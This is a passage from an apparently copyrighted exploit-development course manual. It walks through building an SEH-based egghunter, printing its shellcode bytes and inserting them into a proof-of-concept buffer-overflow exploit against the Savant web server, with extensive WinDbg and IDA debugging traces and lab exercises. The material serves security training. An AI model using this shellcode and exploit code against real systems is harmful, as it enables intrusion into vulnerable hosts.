        # check for signature again 
"       jmp is_egg                          ;"  
"   get_seh_address:                         " 
        # call to a higher address to avoid null bytes & push  
        # return to obtain egghunter position 
"       call build_exception_record         ;"  
        # push 0x0c onto the stack 
"       push 0x0c                           ;"  
        # pop the value into ecx 
"       pop ecx                             ;"  
        # mov into eax the pointer to the CONTEXT  
        # structure for our exception 
"       mov eax, [esp+ecx]                  ;"  
        # mov 0xb8 into ecx which will act as an  
        # offset to the eip 
"       mov cl, 0xb8                        ;"  
        # increase the value of eip by 0x06 in our CONTEXT  
        # so it points to the "or bx, 0xfff" instruction  
        # to increase the memory page 
"       add dword ptr ds:[eax+ecx], 0x06    ;"  
        # save return value into eax 
"       pop eax                             ;"  
        # increase esp to clean the stack for our call 
"       add esp, 0x10                       ;"  
        # push return value back into the stack 
"       push eax                            ;"  
        # null out eax to simulate  
        # ExceptionContinueExecution return 
"       xor eax, eax                        ;"  
        # return 
"       ret                                 ;"  
) 
 
# Initialize engine in X86-32bit mode 
ks = Ks(KS_ARCH_X86, KS_MODE_32) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
206 
encoding, count = ks.asm(CODE) 
print("Encoded %d instructions..." % count) 
 
egghunter = "" 
for dec in encoding:  
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")  
print("egghunter = (\"" + egghunter + "\")") 
Listing 235 - egghunter_seh_original.py Keystone version of the SEH egghunter 
The code from Listing 235 starts by executing a JMP189 instruction to a later part in the code, 
specifically to the get_seh_address function. 
In get_seh_address, the first instruction is a relative CALL190 to the build_exception_record 
function. When executing a relative call, the opcodes will match the offset from the current value 
of EIP. This would normally generate null bytes unless we perform a backward call using a 
negative offset. Additionally, by executing a CALL instruction based on the x86 calling convention, 
we will push the return value to the stack. This allows us to dynamically gather the position of our 
egghunter in memory. 
 
Figure 61: Backwards call with non-null opcodes 
 
189 (JMP - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_147.html 
190 (CALL - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_26.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
207 
 
This technique will be discussed more in-depth in a later module where we will 
tackle the challenge of writing our own shellcode. 
Our egghunter now starts executing the instructions from the build_exception_record function. 
The first instruction is a POP that will store the return value pushed to the stack by our previous 
CALL into ECX. After this, our egg is moved into the EAX register. 
... 
"   build_exception_record:                      " 
        # pop the address of the exception_handler into ecx 
"       pop ecx                                         ;"  
        # mov signature into eax 
"       mov eax, 0x74303077                       ;"  
... 
Listing 236 - Getting the egghunter memory address in ECX and moving the signature in EAX 
The next step involves building our own _EXCEPTION_REGISTRATION_RECORD structure. We do 
this by pushing the value stored in ECX, which holds our return address pointing to the next 
instruction after our CALL to build_exception_record. This will act as the Handler member of the 
_EXCEPTION_REGISTRATION_RECORD structure. We then push the value of “-1” (0xffffffff) as our 
Next member. This signals the end of the singly-linked list storing the exception records. 
... 
        # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure 
"       push ecx                                        ;"  
        # push Next of the _EXCEPTION_REGISTRATION_RECORD structure 
"       push 0xffffffff                             ;"  
... 
Listing 237 - Setting up the _EXCEPTION_REGISTRATION_RECORD 
Finally, the shellcode installs the custom exception handler. It does this by overwriting the 
ExceptionList member in the TEB structure with our stack pointer. 
... 
        # null out ebx 
"       xor ebx, ebx                                  ;"  
        # overwrite ExceptionList in the TEB with a pointer to our new 
_EXCEPTION_REGISTRATION_RECORD structure 
"       mov dword ptr fs:[ebx], esp           ;"  
... 
Listing 238 - Overwriting the ExceptionList 
The next functions (is_egg, loop_inc_page, and loop_inc_one) are meant to search for our egg in 
memory. They are similar to the previous egghunter, but rather than executing the SCASD 
operation twice, we use the REPE191 instruction with the counter stored in ECX. This is done to 
minimize the size of the egghunter. 
 
191 (REPE - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_279.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
208 
Given that we’re not using any system calls to check if a memory page is mapped or if we can 
access it, the access violation will be triggered on the REPE SCASD instruction. This will raise an 
exception that will trigger our custom handler. For this to work, we need to ensure that our 
exception handler can gracefully restore the execution flow back to our egghunter. Because an 
access violation means that the memory page is not valid, we would like our exception handler to 
restore execution at the loop_inc_page function, which will move on to the next memory page. 
During a previous module, we explored the prototype of the _except_handler function. 
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (   
    IN PEXCEPTION_RECORD ExceptionRecord,   
    IN VOID EstablisherFrame,   
    IN OUT PCONTEXT ContextRecord,   
    IN OUT PDISPATCHER_CONTEXT DispatcherContext   
);  
Listing 239 - Prototype for the _except_handler function 
Whenever an exception occurs, the operating system will invoke our _except_handler and pass the 
four parameters from Listing 239 to the stack. 
One parameter we’re particularly interested in is ContextRecord, which points to a CONTEXT 
structure. This structure contains processor-specific register data at the time the exception 
occurred. 
0:006> dt ntdll!_CONTEXT 
   +0x000 ContextFlags     : Uint4B 
   +0x004 Dr0              : Uint4B 
   +0x008 Dr1              : Uint4B 
   +0x00c Dr2              : Uint4B 
   +0x010 Dr3              : Uint4B 
   +0x014 Dr6              : Uint4B 
   +0x018 Dr7              : Uint4B 
   +0x01c FloatSave        : _FLOATING_SAVE_AREA 
   +0x08c SegGs            : Uint4B 
   +0x090 SegFs            : Uint4B 
   +0x094 SegEs            : Uint4B 
   +0x098 SegDs            : Uint4B 
   +0x09c Edi              : Uint4B 
   +0x0a0 Esi              : Uint4B 
   +0x0a4 Ebx              : Uint4B 
   +0x0a8 Edx              : Uint4B 
   +0x0ac Ecx              : Uint4B 
   +0x0b0 Eax              : Uint4B 
   +0x0b4 Ebp              : Uint4B 
   +0x0b8 Eip              : Uint4B 
   +0x0bc SegCs            : Uint4B 
   +0x0c0 EFlags           : Uint4B 
   +0x0c4 Esp              : Uint4B 
   +0x0c8 SegSs            : Uint4B 
   +0x0cc ExtendedRegisters : [512] UChar 
Listing 240 - Dumping the CONTEXT structure in WinDbg 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
209 
At the moment the exception occurs, all register values are stored in this structure. At offset 0xB8 
from the beginning of the CONTEXT structure, we find the Eip member. As the name implies, this 
member stores the memory address pointing to the instruction that caused the access violation. 
This Eip structure member is an important part of the egghunter resuming execution. Because we 
can modify this structure as part of our custom _except_handler implementation, we can also 
resume the execution flow at the loop_inc_page function to move to the next memory page. 
Once this is done, we only need to take care of the return value in EAX. This comes in the form of 
an _EXCEPTION_DISPOSITION structure containing four members, each of them acting as a 
return value. 
0:006> dt _EXCEPTION_DISPOSITION 
ntdll!_EXCEPTION_DISPOSITION 
   ExceptionContinueExecution = 0n0 
   ExceptionContinueSearch = 0n1 
   ExceptionNestedException = 0n2 
   ExceptionCollidedUnwind = 0n3 
Listing 241 - Dumping the _EXCEPTION_DISPOSITION structure in WinDbg 
According to Listing 241, to gracefully continue the execution, we have to use the 
ExceptionContinueExecution return value (0x00) to signal that the exception has been 
successfully handled. 
Let’s quickly summarize the way our custom _except_handler works. When the exception is 
triggered and our function is executed, we retrieve the ContextRecord parameter from the stack at 
offset 0x0C (because it is the third argument). 
... 
"       push 0x0c                                     ;"  
        # pop the value into ecx 
"       pop ecx                                         ;"  
        # mov into eax the pointer to the CONTEXT structure for our exception 
"       mov eax, [esp+ecx]                        ;"  
... 
Listing 242 - Get the pointer to the CONTEXT structure in EAX 
After retrieving the ContextRecord parameter, we dereference the ContextRecord address at 
offset 0xB8 to obtain the Eip member. Once we have the value of the Eip member, we can align it 
to the loop_inc_page function with arithmetic operations. Then we save the return address in EAX 
and increase the stack pointer past the arguments. 
        # mov 0xb8 into ecx which will act as an  
        # offset to the eip 
"       mov cl, 0xb8                        ;"  
        # increase the value of eip by 0x06 in our CONTEXT  
        # so it points to the "or bx, 0xfff" instruction  
        # to increase the memory page 
"       add dword ptr ds:[eax+ecx], 0x06    ;"  
        # save return value into eax 
"       pop eax                             ;"  
        # increase esp to clean the stack for our call 
"       add esp, 0x10                       ;"  
Listing 243 - Adjust the Eip member in order for it to point to the loop_inc_page function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
210 
Finally, we push the previously-stored return address back on the stack and null out EAX to signal 
that the exception has been successfully handled. Then, we execute a return instruction, which 
will take us back to the loop_inc_page function. 
... 
"       push eax                                        ;"  
    # null out eax to simulate  
        # ExceptionContinueExecution return 
"       xor eax, eax                        ;"  
        # return 
"       ret                                               ;"  
... 
Listing 244 - Push the return address and set EAX to ExceptionContinueExecution 
Now that we understand how the egghunter works, let’s generate the opcodes for it by running 
our Python script. 
kali@kali:~/Documents$ python3 egghunter_seh_original.py 
Encoded 35 instructions... 
egghunter = 
("\xeb\x21\x59\xb8\x77\x30\x30\x74\x51\x6a\xff\x31\xdb\x64\x89\x23\x6a\x02\x59\x89\xdf
\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xda\xff\xff\xff\x6a\x0c\x
59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3") 
Listing 245 - Obtaining the opcodes for our SEH egghunter 
Notice the increased size compared to our previous egghunter. While this egghunter technique is 
very portable, it does come with a significant increase in size. This needs to be taken into account 
in cases where we do not have enough space and therefore have to use our previous technique. 
Let’s replace our previous egghunter with the newly-generated one in our proof of concept and 
follow the steps in WinDbg. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; 
je 0x17  
 
  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled 
               b"\xeb\x21\x59\xb8\x77\x30\x30\x74" 
               b"\x51\x6a\xff\x31\xdb\x64\x89\x23" 
               b"\x6a\x02\x59\x89\xdf\xf3\xaf\x75" 
               b"\x07\xff\xe7\x66\x81\xcb\xff\x0f" 
               b"\x43\xeb\xed\xe8\xda\xff\xff\xff" 
               b"\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8" 
               b"\x83\x04\x08\x06\x58\x83\xc4\x10" 
               b"\x50\x31\xc0\xc3") 
 
  inputBuffer = b"\x41" * (size - len(egghunter)) 
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n\r\n" 
... 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
211 
Listing 246 - egghunter_0x10.py: Replacing our sytem call egghunter with our SEH-based one 
We will set a breakpoint at the POP EAX; RET instruction sequence and then reach the beginning 
of our egghunter. 
0:008> bp 0x00418674 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
*** ERROR: Module load completed but symbols could not be loaded for 
C:\Savant\Savant.exe 
 
0:008> g 
Breakpoint 0 hit 
eax=00000000 ebx=015c5750 ecx=0000000e edx=77994550 esi=015c5750 edi=0041703c 
eip=00418674 esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18674: 
00418674 58              pop     eax 
... 
 
0:003> t 
eax=0307fe70 ebx=015c5750 ecx=00000000 edx=77994550 esi=015c5750 edi=0041703c 
eip=0307eaa5 esp=0307ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0307eaa5 eb21            jmp     0307eac8 
Listing 247 - Checking the bad characters from our secondary buffer in memory 
Now that we have reached the beginning of our egghunter, let’s go through the major steps with 
WinDbg. We begin by jumping down to the get_seh_address function. We’ll perform a backwards 
relative CALL to build_exception_record This helps us avoid null bytes and also pushes the return 
address onto the stack. 
0:003> t 
eax=0307fe70 ebx=015c5750 ecx=00000000 edx=77994550 esi=015c5750 edi=0041703c 
eip=0307eac8 esp=0307ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0307eac8 e8daffffff      call    0307eaa7 
 
0:003> dds @esp L4 
0307ea34  0041703c Savant+0x1703c 
0307ea38  015c5750 
0307ea3c  015c5750 
0307ea40  00000000 
 
0:003> t 
eax=0307fe70 ebx=015c5750 ecx=00000000 edx=77994550 esi=015c5750 edi=0041703c 
eip=0307eaa7 esp=0307ea30 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0307eaa7 59              pop     ecx 
 
0:003> dds @esp L4 
0307ea30  0307eacd 
0307ea34  0041703c Savant+0x1703c 
0307ea38  015c5750 
0307ea3c  015c5750 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
212 
0:003> u 0307eacd 
0307eacd 6a0c            push    0Ch 
0307eacf 59              pop     ecx 
0307ead0 8b040c          mov     eax,dword ptr [esp+ecx] 
0307ead3 b1b8            mov     cl,0B8h 
0307ead5 83040806        add     dword ptr [eax+ecx],6 
0307ead9 58              pop     eax 
0307eada 83c410          add     esp,10h 
0307eadd 50              push    eax 
Listing 248 - Dynamically obtaining the position of our egghunter in memory 
Listing 248 confirms that the CALL instruction does not contain any null bytes. Once it is 
executed, the return address is pushed onto the stack, which points to the next instruction after 
the call. These instructions will act as our custom _except_handler function implementation. 
Now we are at the beginning of the build_exception_record function. We start by executing a POP 
ECX instruction. This will store the return address (a pointer to our _except_handler function) into 
ECX. This is followed by a MOV EAX instruction, which will place our egg in EAX. 
The next few instructions will replace the current ExceptionList with our fake one. We begin by 
pushing the value of the ECX register (_except_handler) as well as the value 0xffffffff. These two 
values will act as our _EXCEPTION_REGISTRATION_RECORD structure. 
These values are pushed onto the stack because the ExceptionList requires a 
pointer to the first _EXCEPTION_REGISTRATION_RECORD structure, which we 
can provide by using the ESP register. 
0:003> t 
eax=54303057 ebx=015c5750 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c 
eip=0307eaad esp=0307ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0307eaad 51              push    ecx 
 
0:003> t 
eax=54303057 ebx=015c5750 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c 
eip=0307eaae esp=0307ea30 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0307eaae 6aff            push    0FFFFFFFFh 
 
0:003> t 
eax=54303057 ebx=015c5750 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c 
eip=0307eab0 esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0307eab0 31db            xor     ebx,ebx 
 
0:003> dds @esp L2 
0307ea2c  ffffffff 
0307ea30  0307eacd 
Listing 249 - Creating our _EXCEPTION_REGISTRATION_RECORD structure on the stack 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
213 
After setting up our fake _EXCEPTION_REGISTRATION_RECORD structure, we perform an XOR 
operation to null EBX. We then use that value to dereference an offset into the FS register. 
In a previous module, we learned that offset 0x00 holds a pointer to the current TEB. We will 
couple this dereference with the MOV instruction to essentially overwrite the first member of the 
TEB structure, the ExceptionList, with the current value of ESP. 
0:003> r 
eax=54303057 ebx=00000000 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c 
eip=0307eab2 esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0307eab2 648923          mov     dword ptr fs:[ebx],esp fs:003b:00000000=0307ff70 
 
0:003> r @ebx 
ebx=00000000 
 
0:003> !teb 
TEB at 7ffdb000 
    ExceptionList:        0307ff70 
    StackBase:            03080000 
    StackLimit:           0307c000 
... 
 
0:003> t 
eax=54303057 ebx=00000000 ecx=0307eacd edx=77994550 esi=015c5750 edi=0041703c 
eip=0307eab5 esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0307eab5 6a02            push    2 
 
0:003> !teb 
TEB at 7ffdb000 
    ExceptionList:        0307ea2c 
    StackBase:            03080000 
    StackLimit:           0307c000 
... 
 
0:003> dt _EXCEPTION_REGISTRATION_RECORD 0307ea2c 
ntdll!_EXCEPTION_REGISTRATION_RECORD 
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD 
   +0x004 Handler          : 0x0307eacd     _EXCEPTION_DISPOSITION  +307eacd 
Listing 250 - Overwriting the ExceptionList with our own _EXCEPTION_REGISTRATION_RECORD 
We 
were 
successfully 
able 
to 
overwrite 
the 
ExceptionList 
with 
our 
custom 
_EXCEPTION_REGISTRATION_RECORD structure. Furthermore, we made sure to set the Next 
member to “-1”, signaling that this is the last exception handler. 
Once this is done, we proceed with the is_egg function until we reach the REPE SCASD instruction. 
Our egghunter starts at the null page (0x00000000). Since this memory page is not available to 
the vulnerable software, we will trigger an access violation. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
214 
 
Since the release of Windows 8, Microsoft has made the null page (0x00000000) 
inaccessible to any processes outside of the operating system itself. This was 
done to mitigate various bugs that would use this address. 
0:003> t 
eax=54303057 ebx=00000000 ecx=00000002 edx=77994550 esi=015c5750 edi=00000000 
eip=0307eaba esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0307eaba f3af            repe scas dword ptr es:[edi] 
 
0:003> dd edi 
00000000  ???????? ???????? ???????? ???????? 
00000010  ???????? ???????? ???????? ???????? 
00000020  ???????? ???????? ???????? ???????? 
00000030  ???????? ???????? ???????? ???????? 
00000040  ???????? ???????? ???????? ???????? 
00000050  ???????? ???????? ???????? ???????? 
00000060  ???????? ???????? ???????? ???????? 
00000070  ???????? ???????? ???????? ???????? 
 
0:003> t 
(8e4.904): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=54303057 ebx=00000000 ecx=00000002 edx=77994550 esi=015c5750 edi=00000000 
eip=0307eaba esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
0307eaba f3af            repe scas dword ptr es:[edi] 
Listing 251 - Triggering the access violation 
Let’s try to inspect the current exception chain and ensure that the SEH mechanism will invoke 
our custom _except_handler function. 
0:003> !exchain 
0307ea2c: 0307eacd 
Invalid exception stack at ffffffff 
 
0:003> u 0307eacd 
 
0307eacd 6a0c            push    0Ch 
0307eacf 59              pop     ecx 
0307ead0 8b040c          mov     eax,dword ptr [esp+ecx] 
0307ead3 b1b8            mov     cl,0B8h 
0307ead5 83040806        add     dword ptr [eax+ecx],6 
0307ead9 58              pop     eax 
0307eada 83c410          add     esp,10h 
0307eadd 50              push    eax 
Listing 252 - Inspecting the exception chain that will be used to handle the access violation 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
215 
Excellent! Now we can set a breakpoint at the address of our _except_handler function and let the 
execution resume. This will invoke the SEH mechanism to handle our exception and eventually 
call our function. 
0:003> bp 0307eacd 
 
0:003> bl 
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674 
     1 e Disable Clear  0307eacd     0001 (0001)  0:****  
 
0:003> g 
(8e4.904): Access violation - code c0000005 (!!! second chance !!!) 
eax=54303057 ebx=00000000 ecx=00000002 edx=77994550 esi=015c5750 edi=00000000 
eip=0307eaba esp=0307ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
0307eaba f3af            repe scas dword ptr es:[edi] 
Listing 253 - Missing the breakpoint at our _except_handler function 
Unfortunately, we never reach our _except_handler function. As shown in Listing 253, when we 
resume execution, we trigger the access violation again. 
As previously noted, this code was published quite some time ago. Since then, changes may have 
occurred in the operating system that are now causing it to fail. To solve this issue, we first need 
to explore the code used by the SEH mechanism to get a better understanding of what is going 
on. 
6.7.1.1 Exercises 
1. 
Go over the SEH implementation of the egghunter and make sure you understand the 
assembly code as well as how it abuses the SEH mechanism. If necessary, review the theory 
covered in “Exploiting SEH Overflows” again. 
2. 
Generate the opcodes and update your proof of concept to include the new egghunter. 
3. 
Launch the proof of concept and follow the egghunter instructions in WinDbg. 
4. 
Set a breakpoint at your custom _except_handler function and confirm that you do not hit the 
breakpoint after resuming the execution flow. 
6.7.2 Identifying the SEH-Based Egghunter Issue 
To get to the root cause of our problem, we will need to take a closer look at the functions 
responsible for triggering the SEH mechanism. 
To do this, we will use a combination of static and dynamic analysis. We will open ntdll.dll in IDA 
and run our previous proof of concept, which should raise an access violation in WinDbg. 
The ntdll.dll file has already been disassembled in IDA and is available on your dedicated 
Windows 10 client with helpful bookmarks. 
Rather than going through every assembly instruction and following every 
branch, we will focus on the key checks that are required in order to fix our 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
216 
egghunter. Later modules in this course will cover dynamic and static code 
analysis side by side in more detail, but it is out of scope for this module. 
Our goal is to walk through the assembly instructions side by side between WinDbg and IDA to 
better understand where the issue occurs. 
From a previous module, we know that when an exception is raised, a call to 
ntdll!KiUserExceptionDispatcher is made. This function will then call RtlDispatchException, which 
will retrieve the ExceptionList and parse it. 
 
Figure 62: IDA graph view of KiUserExceptionDispatcher 
Some of the functions presented in the IDB file have been renamed to contain the 
correct function names. The names were retrieved using the “u” command inside 
WinDbg. 
Let’s confirm that RtlDispatchException is called inside our debugger. Once we trigger our access 
violation, we can set a breakpoint at the function and let the execution flow resume. 
0:009> g 
(390.113c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=54303057 ebx=00000000 ecx=00000002 edx=77cd1670 esi=01755760 edi=00000000 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
217 
eip=03e4eaba esp=03e4ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
03e4eaba f3af            repe scas dword ptr es:[edi] 
 
0:002> bp ntdll!RtlDispatchException 
 
0:002> bl 
     0 e Disable Clear  77c86a10     0001 (0001)  0:**** ntdll!RtlDispatchException 
 
0:002> g 
Breakpoint 0 hit 
eax=54303057 ebx=03e4e5c0 ecx=03e4e5dc edx=77cd1670 esi=01755760 edi=00000000 
eip=77c86a10 esp=03e4e5ac ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!RtlDispatchException: 
77c86a10 8bff            mov     edi,edi 
 
0:002> bd 0 
Listing 254 - Halting the execution flow at RtlDispatchException 
We successfully hit our breakpoint. At this point, we continue to alternate between IDA and 
WinDbg, paying close attention to the conditional jumps of each block and their conditions in 
order to determine where the issue occurs. 
As 
a 
final 
step 
before 
proceeding, 
we’ll 
disable 
the 
previous 
breakpoint 
at 
ntdll!RtlDispatchException. We do this because the function is called often, and we want to ensure 
we don’t hit the breakpoint if it is called from a different thread. 
While going through the code blocks of the RtlDispatchException function, we reach an interesting 
block where RtlpGetStackLimits192 is called. It stands out because RtlpGetStackLimits is used to 
retrieve the current stack limits, as its name implies. The TEB structure contains the StackBase 
and StackLimit values right after the ExceptionList. 
0:006> dt _NT_TIB 
ntdll!_NT_TIB 
   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD 
   +0x004 StackBase        : Ptr32 Void 
   +0x008 StackLimit       : Ptr32 Void 
   +0x00c SubSystemTib     : Ptr32 Void 
   +0x010 FiberData        : Ptr32 Void 
   +0x010 Version          : Uint4B 
   +0x014 ArbitraryUserPointer : Ptr32 Void 
   +0x018 Self             : Ptr32 _NT_TIB 
Listing 255 - Dumping the _NT_TIB structure in WinDbg 
Since the exception handlers are stored at the beginning of the stack space, there might be 
checks on the address where our custom _EXCEPTION_REGISTRATION_RECORD structure is 
located. Let’s inspect the code block in IDA. 
 
192 (RtlpGetStackLimits), http://www.codewarrior.cn/ntdoc/win2k/rtl/ia64/RtlpGetStackLimits.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
218 
 
Figure 63: Code block calling RtlpGetStackLimits 
The above code block sets two registers (EDX and ECX) using the LEA193 instruction. The 
registers are set based on the value of ESP along with two static variables right before our CALL 
instruction. The function returns the StackBase and StackLimit members, so we can assume that 
the EDX and ECX registers will contain some memory addresses used to store these values. 
Immediately after the call, the ExceptionList (which is the first member of the TEB structure) is 
moved to ESI. 
To confirm this, let’s follow the RtlpGetStackLimits function in IDA. The first code block moves a 
dereference from fs:[0x18] into EAX. At offset 0x18 in the TEB structure, we have the Self 
member, which contains the virtual memory address of the TEB. 
After the TEB is stored in EAX, we execute two more dereferences. The first dereference occurs 
on [EAX+0x04] (StackBase) and is stored in ESI. The second dereference is done on [EAX+0x08] 
(StackLimit) and is stored in EAX. 
Both registers (ESI and EAX) are written to the memory addresses pointed to by EDX and ECX, 
which were set up before the call. 
 
193 (LEA - x86 Instruction Set Reference), https://x86.puri.sm/html/file_module_x86_id_153.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
219 
 
Figure 64: Getting the StackBase and StackLimit 
Let’s return to the previous code block, where RtlpGetStackLimits is called. Following the 
execution blocks, we notice that the storage space for the StackBase and StackLimit is re-used. 
This time, the values are stored in EDI and EBX. 
 
Figure 65: StackBase and StackLimit moved to EDI and EBX 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
220 
 
Let’s confirm this by setting a breakpoint at the first MOV instruction and then execute it until we 
reach a branching instruction. After that, we’ll compare the values stored in EDI and EBX to the 
StackBase and StackLimit from our current TEB. 
0:002> bp ntdll + 46AD1 
 
0:002> g 
Breakpoint 1 hit 
eax=00000000 ebx=03e4e5dc ecx=03e4e4fc edx=77cd1670 esi=03e4ea2c edi=00000000 
eip=77c86ad1 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!RtlDispatchException+0xc1: 
77c86ad1 8b7c2420        mov     edi,dword ptr [esp+20h] ss:0023:03e4e538=03e4c000 
 
0:002> t 
eax=00000000 ebx=03e4e5dc ecx=03e4e4fc edx=77cd1670 esi=03e4ea2c edi=03e4c000 
eip=77c86ad5 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!RtlDispatchException+0xc5: 
77c86ad5 8b5c2428        mov     ebx,dword ptr [esp+28h] ss:0023:03e4e540=03e50000 
 
0:002> t 
eax=00000000 ebx=03e50000 ecx=03e4e4fc edx=77cd1670 esi=03e4ea2c edi=03e4c000 
eip=77c86ad9 esp=03e4e518 ebp=03e4e5a8 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!RtlDispatchException+0xc9: 
77c86ad9 7553            jne     ntdll!RtlDispatchException+0x11e (77c86b2e) [br=0] 
 
0:002> !teb 
TEB at 003e1000 
    ExceptionList:        03e4ea2c 
    StackBase:            03e50000 
    StackLimit:           03e4c000 
    SubSystemTib:         00000000 
... 
 
0:002> r @edi; r @ebx 
edi=03e4c000 
ebx=03e50000 
Listing 256 - Comparing the EDI and EBX registers with the StackBase and StackLimit 
Listing 256 confirms that EDI and EBX have been set to the StackLimit and StackBase 
respectively. Right after the call to RtlpGetStackLimits, the ExceptionList was moved to the ESI 
register. 
Inspecting the code blocks in IDA, we find a call to RtlIsValidHandle, which is responsible for 
various checks including the SafeSEH implementation. When we continue our inspection of other 
code blocks, we aren’t able to find another call to this function. This means we have to reach this 
